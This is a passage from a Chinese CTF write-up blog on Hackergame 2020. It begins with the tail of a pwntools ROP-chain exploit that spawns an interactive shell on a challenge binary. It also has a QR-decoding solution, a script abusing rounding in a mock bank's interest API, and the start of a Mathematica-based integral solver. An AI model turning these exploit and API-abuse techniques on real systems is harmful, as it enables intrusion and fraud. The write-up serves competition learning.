p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000402bf4</span><span class="token punctuation">)</span>  <span class="token comment"># syscall</span>
payload <span class="token operator">+=</span> p

sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'such as (0,1): '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107011551816.png" alt="flag2"></p>
<hr>
<h2 id="来自未来的信笺"><a href="#来自未来的信笺" class="headerlink" title="来自未来的信笺"></a>来自未来的信笺</h2><p><em>（复现）</em></p>
<blockquote>
<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>
<p>“Send from Arctic.” 正文就只有这一句话。</p>
<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>
<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>
</blockquote>
<p>这题做的时候已经想到是 <a target="_blank" rel="noopener" href="https://archiveprogram.github.com/">GitHub Archive Program</a> 了，但没想到真就整了一题。</p>
<p>一堆二维码。第一张出来是个 <code>META</code>.</p>
<p>前几张二维码里有一张内容是 GitHub 的 API 列表。对应的仓库是 openlug/nonexist。</p>
<p>然后我真去找了，发现没有，一种可能是 Private Repo，可能之前有过 Public？</p>
<p>于是去找了一些公开的 GitHub Archive 网站，并没有找到。</p>
<p>另一种可能就是假的了，真不存在。</p>
<p>不管了先把所有的二维码给解码出来，合并到一个文件里。</p>
<p>比赛做题的时候用的 Python 的 <code>pyzbar</code> 库，还特地注意了用 <code>rb</code> 以二进制来写入文件，然而出来的文件啥也不是……啥文件头都找不到，就离谱。</p>
<p>比赛结束了才知道是这个解析库本身存在问题，在 <code>\x00</code> 处会截断。</p>
<p>参考官方 WP 以及 总榜 rk1 大师傅的 WP，可以用 <a target="_blank" rel="noopener" href="https://github.com/mchehab/zbar/tree/master">zbarimg</a> 这个命令行工具来解码。</p>
<p><del>（脏话一堆，别问，问就是装 zbarimg 心态炸了</del></p>
<p>这里就用 Python 调用命令行来执行好了。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os

file_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span><span class="token string">'./frames'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> f <span class="token keyword">in</span> file_list<span class="token punctuation">:</span>
    fi <span class="token operator">=</span> <span class="token string">'./frames/'</span> <span class="token operator">+</span> f
    cmd <span class="token operator">=</span> <span class="token string">'zbarimg --raw -Sbinary %s &gt;&gt; frames.tar'</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd <span class="token operator">%</span> fi<span class="token punctuation">)</span></code></pre>
<p>然后这个出来的 <code>frames.tar</code> 是个压缩包，解压再解压就能拿到 flag 了。</p>
<blockquote>
<p>BTW, 比赛结束才知道那个 META 其实并不是个 Private Repo，而是 openlug/django-common，就去年 hackergame 的一道题。。</p>
</blockquote>
<hr>
<h2 id="狗狗银行"><a href="#狗狗银行" class="headerlink" title="狗狗银行"></a>狗狗银行</h2><p>这题也有点意思。</p>
<p><strong>四舍五入薅羊毛大法</strong>好啊。（当然这也是一种可行方案啦）</p>
<p><strong>储蓄卡 利率每日 0.3%</strong></p>
<p>因此 五入 最少需要 0.5/0.003=167。</p>
<p><strong>信用卡 利率每日 0.5%，最低 10</strong></p>
<p>最划算的话是 10/0.005=2000，且欠款在 2000 到 2100 之间每日利息都是10。</p>
<p>把欠款控制在这个范围内就能薅羊毛了。</p>
<p>2000/167 =&gt; 12 借款分到12张储蓄卡中。</p>
<p>首先开6张信用卡，开12*6张储蓄卡，且依次转账到储蓄卡，每张卡167，确保每天有1的利息。</p>
<p>首先用初始的储蓄卡1000元吃饭，等储蓄卡余额 &gt;= 177 的时候就能用储蓄卡还款+吃饭了。</p>
<p>最开始点的手累死了，想想算了写脚本吧。</p>
<p>首先把各个方法封装好。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token triple-quoted-string string">"""
Hackergame 2020
狗狗银行

@Author: MiaoTony
@Time: 20201102
"""</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> json

url_prefix <span class="token operator">=</span> <span class="token string">r'http://202.38.93.111:10100/api/'</span>
headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"202.38.93.111:10100"</span><span class="token punctuation">,</span>
    <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">"http://202.38.93.111:10100"</span><span class="token punctuation">,</span>
    <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://202.38.93.111:10100/"</span><span class="token punctuation">,</span>
    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json;charset=utf-8"</span><span class="token punctuation">,</span>
    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"</span><span class="token punctuation">,</span>
    <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span><span class="token punctuation">,</span>
    <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span>
    <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"keep-alive"</span><span class="token punctuation">,</span>
    <span class="token string">"Cache-Control"</span><span class="token punctuation">:</span> <span class="token string">"max-age=0"</span><span class="token punctuation">,</span>
    <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string">"Bearer &lt;your_token&gt;"</span><span class="token punctuation">,</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"session=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>headers <span class="token operator">=</span> headers


<span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span>kind<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    办卡 
    :param kind: {str} `credit`信用卡，`debit`储蓄卡
    """</span>
    url <span class="token operator">=</span> url_prefix <span class="token operator">+</span> <span class="token string">'create'</span>
    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span> kind<span class="token punctuation">}</span>
    r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> r<span class="token punctuation">.</span>text


<span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    获取用户信息
    """</span>
    url <span class="token operator">=</span> url_prefix <span class="token operator">+</span> <span class="token string">'user'</span>
    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
    <span class="token comment"># print(r.json())</span>
    <span class="token keyword">return</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_balance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    获取净资产
    """</span>
    info <span class="token operator">=</span> get_info<span class="token punctuation">(</span><span class="token punctuation">)</span>
    accounts <span class="token operator">=</span> info<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'accounts'</span><span class="token punctuation">)</span>
    balance <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> account <span class="token keyword">in</span> accounts<span class="token punctuation">:</span>
        <span class="token keyword">if</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'debit'</span><span class="token punctuation">:</span>
            balance <span class="token operator">+=</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'balance'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'credit'</span><span class="token punctuation">:</span>
            balance <span class="token operator">-=</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'balance'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> balance


<span class="token keyword">def</span> <span class="token function">get_debt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    获取欠款
    """</span>
    info <span class="token operator">=</span> get_info<span class="token punctuation">(</span><span class="token punctuation">)</span>
    accounts <span class="token operator">=</span> info<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'accounts'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> account <span class="token keyword">in</span> accounts<span class="token punctuation">:</span>
        <span class="token keyword">if</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'credit'</span><span class="token punctuation">:</span>
            debt <span class="token operator">=</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'balance'</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">return</span> debt


<span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    转账
    """</span>
    url <span class="token operator">=</span> url_prefix <span class="token operator">+</span> <span class="token string">'transfer'</span>
    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"src"</span><span class="token punctuation">:</span> src<span class="token punctuation">,</span> <span class="token string">"dst"</span><span class="token punctuation">:</span> dst<span class="token punctuation">,</span> <span class="token string">"amount"</span><span class="token punctuation">:</span> amount<span class="token punctuation">}</span>
    r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> r<span class="token punctuation">.</span>text


<span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    吃饭
    """</span>
    url <span class="token operator">=</span> url_prefix <span class="token operator">+</span> <span class="token string">'eat'</span>
    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"account"</span><span class="token punctuation">:</span> account<span class="token punctuation">}</span>
    r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> r<span class="token punctuation">.</span>text</code></pre>
<p>办卡、转账。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 先办卡 1储蓄卡 2-7信用卡 8-79储蓄卡</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    create_card<span class="token punctuation">(</span><span class="token string">'credit'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">*</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    create_card<span class="token punctuation">(</span><span class="token string">'debit'</span><span class="token punctuation">)</span>
info <span class="token operator">=</span> get_info<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 转账，每张卡转167</span>
<span class="token keyword">for</span> credit_id <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>credit_id<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        dst <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> <span class="token punctuation">(</span>credit_id<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> i
        amount <span class="token operator">=</span> <span class="token number">167</span>
        transfer<span class="token punctuation">(</span>src<span class="token operator">=</span>credit_id<span class="token punctuation">,</span> dst<span class="token operator">=</span>dst<span class="token punctuation">,</span> amount<span class="token operator">=</span>amount<span class="token punctuation">)</span></code></pre>
<p>最后是每天稳定赚2狗币，写个循环。</p>
<p>当欠款到了2104时依次用储蓄卡还款，一直还到2004，否则就每天恰饭顺便薅羊毛。</p>
<pre class="language-python" data-language="python"><code class="language-python">debit_card_id <span class="token operator">=</span> <span class="token number">8</span>   <span class="token comment"># 储蓄卡</span>
credit_card_id <span class="token operator">=</span> <span class="token number">2</span>  <span class="token comment"># 信用卡</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    debt <span class="token operator">=</span> get_debt<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> get_debt<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2104</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            <span class="token comment"># 依次用后面的储蓄卡给信用卡还款</span>
            transfer<span class="token punctuation">(</span>debit_card_id<span class="token punctuation">,</span> credit_card_id<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
            debit_card_id <span class="token operator">+=</span> <span class="token number">1</span>
            credit_card_id <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">if</span> credit_card_id <span class="token operator">&gt;</span> <span class="token number">7</span><span class="token punctuation">:</span>
                credit_card_id <span class="token operator">=</span> <span class="token number">2</span>
            <span class="token keyword">if</span> debit_card_id <span class="token operator">&gt;</span> <span class="token number">79</span><span class="token punctuation">:</span>
                debit_card_id <span class="token operator">=</span> <span class="token number">8</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=============================="</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>get_balance<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    eat<span class="token punctuation">(</span>debit_card_id<span class="token punctuation">)</span>
    debit_card_id <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">if</span> debit_card_id <span class="token operator">&gt;</span> <span class="token number">79</span><span class="token punctuation">:</span>
        debit_card_id <span class="token operator">=</span> <span class="token number">8</span>

    <span class="token keyword">if</span> get_balance<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">2000</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>get_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span></code></pre>
<p>跑了贼久，终于得到 flag 了。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102172850413.png" alt="flag"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102172637058.png" alt="flag"></p>
<hr>
<h2 id="超基础的数理模拟器"><a href="#超基础的数理模拟器" class="headerlink" title="超基础的数理模拟器"></a>超基础的数理模拟器</h2><p><em>（复现）</em></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108021733621.png" alt="题目"></p>
<p>这题需要有很扎实的数理基础才行……（废话</p>
<p>第一种解法是手算或者直接按计算器，但我按了几题放弃了。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108024803778.png" alt="正确的提示"></p>
<p>另外一种是借助网络上公开的计算器，准备爬个接口或者自己构造一个接口来用，搜遍了发现有几个<strong>可能可以用的</strong>：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://zs.symbolab.com/solver/step-by-step/">一步步解的计算器 symbolab</a></li>
<li><a target="_blank" rel="noopener" href="https://zh.numberempire.com/definiteintegralcalculator.php">定积分计算器</a></li>
<li><a target="_blank" rel="noopener" href="https://www.wolframalpha.com/">WolframAlpha</a></li>
<li>etc.</li>
</ul>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108022303182.png" alt="题目源代码"></p>
<p>然而发现都<strong>不能直接解析</strong>题目所给的 LaTeX，或者<strong>解不出来</strong>，再或者解出来的话<strong>精度也不够</strong>……</p>
<p>还有一种方案，是调用本地的服务解析 LaTeX，再进行积分运算。</p>
<p>于是想到了某红色软件，Mathematica，又称 MMA。</p>
<p>早就听说这玩意符号计算贼厉害了，虽然之前也没用过，还是比赛现装现学的，但用了就发现真的强，太香了，<del>早知道用来解高数里的微积分题多好</del>。</p>
<p>搜了搜发现 MMA 支持解析 LaTeX 表达式，太好了！</p>
<p>原理就是用 Python 的 requests 库把题目网页爬下来，用 Beautifulsoup 解析得到 LaTeX 公式，调用 MMA 解析表达式并进行积分运算，最后用 requests 提交答案，做一个循环解个400题就完事了。</p>
<p>参考 <a target="_blank" rel="noopener" href="https://reference.wolfram.com/language/tutorial/ImportingAndExporting.html#32618">Wolfram 官方文档 生成和导入 TeX</a>，可以用下面的语句将 LaTeX 转换为 MMA 的表达式。</p>
<pre class="language-mathematica" data-language="mathematica"><code class="language-mathematica">ToExpression["input",TeXForm]</code></pre>
<p>但由于 MMA 不支持这个题目给的这个 LaTeX 格式，需要把积分上下限提取出来，最后的 <code>{d x}</code> 也要替换为 <code>dx</code>，所有的单斜杠 <code>\</code> 要替换为双斜杠 <code>\\</code>，积分表达式也要用 <code>\\left(</code> <code>\\right)</code> 包含起来。</p>
<p>好了，现在在 MMA 里调好能解析 LaTeX 并积分了，下面来整和 Python 的接口。</p>
<p>参考 <a target="_blank" rel="noopener" href="https://reference.wolfram.com/language/WolframClientForPython/index.html">wolfram 官方文档 Wolfram Client Library for Python</a>，官方提供了一个客户端进行交互，也可以在 MMA 里调用 Python 执行。</p>
